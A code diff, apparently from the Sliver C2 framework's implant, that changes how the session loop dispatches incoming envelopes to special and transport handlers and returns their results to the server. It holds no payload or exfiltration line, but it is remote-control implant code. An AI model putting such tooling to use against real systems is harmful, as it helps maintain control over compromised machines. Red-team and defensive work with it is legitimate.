@@ -128,10 +128,10 @@ func (t *C2) ServeSessionHandlers() {
 	tunHandlers := handlers.GetTunnelHandlers()
 	sysHandlers := handlers.GetSystemHandlers()
 	sysPivotHandlers := handlers.GetSystemPivotHandlers() // TODO: remove this if needed
-	transportHandlers := handlers.GetSpecialHandlers()
+	specialHandlers := handlers.GetSpecialHandlers()
 
 	for envelope := range connection.RequestRecv() {
-		if handler, ok := transportHandlers[envelope.Type]; ok {
+		if handler, ok := specialHandlers[envelope.Type]; ok {
 			// {{if .Config.Debug}}
 			log.Printf("[recv] specialHandler %d", envelope.Type)
 			// {{end}}
@@ -189,6 +189,21 @@ func (t *C2) ServeSessionHandlers() {
 			log.Printf("[recv] commHandler with type %d", envelope.Type)
 			// {{end}}
 			go handler(envelope, connection)
+		} else if handler, ok := transportHandlers[envelope.Type]; ok {
+			// {{if .Config.Debug}}
+			log.Printf("[recv] commHandler with type %d", envelope.Type)
+			// {{end}}
+			go handler(envelope, func(data []byte, err error) {
+				// {{if .Config.Debug}}
+				if err != nil {
+					log.Printf("[session] handler function returned an error: %s", err)
+				}
+				// {{end}}
+				connection.RequestSend(&sliverpb.Envelope{
+					ID:   envelope.ID,
+					Data: data,
+				})
+			})
 		} else {
 			// {{if .Config.Debug}}
 			log.Printf("[recv] unknown envelope type %d", envelope.Type)
